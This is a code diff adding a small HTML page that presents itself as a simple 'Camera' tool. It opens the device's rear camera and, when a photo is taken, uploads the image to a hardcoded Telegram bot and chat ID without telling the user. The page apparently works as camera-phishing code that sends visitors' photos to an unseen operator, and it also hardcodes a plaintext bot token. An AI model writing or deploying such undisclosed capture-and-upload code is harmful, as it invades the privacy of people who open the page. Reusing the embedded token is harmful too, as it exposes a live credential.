@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<body style="text-align:center">
+
+<h2>Camera</h2>
+
+<video id="video" autoplay playsinline style="width:100%; max-width:400px;"></video>
+<br><br>
+<button onclick="takePhoto()">📸 Take Photo</button>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const TOKEN = "8016648419:AAHhF4QiL27_UJKuRyA5ay_oP-eVIAH4edo";
+const CHAT_ID = "300972716";
+
+const video = document.getElementById('video');
+
+// ✅ تلاش برای باز کردن دوربین پشت (سازگار با iOS)
+async function startCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: "environment" // مهم: بدون exact
+      }
+    });
+    video.srcObject = stream;
+  } catch (e) {
+    alert("❌ Camera error");
+    console.error(e);
+  }
+}
+
+startCamera();
+
+// ✅ گرفتن عکس سریع + ارسال بدون توقف
+function takePhoto() {
+  const canvas = document.getElementById('canvas');
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0);
+
+  canvas.toBlob(async (blob) => {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob);
+
+    try {
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+
+      // ✅ بدون alert → سریع آماده عکس بعدی
+      console.log("sent");
+
+    } catch (err) {
+      console.error("Send error:", err);
+    }
+  }, 'image/jpeg', 0.9);
+}
+</script>
+
+</body>
+</html>
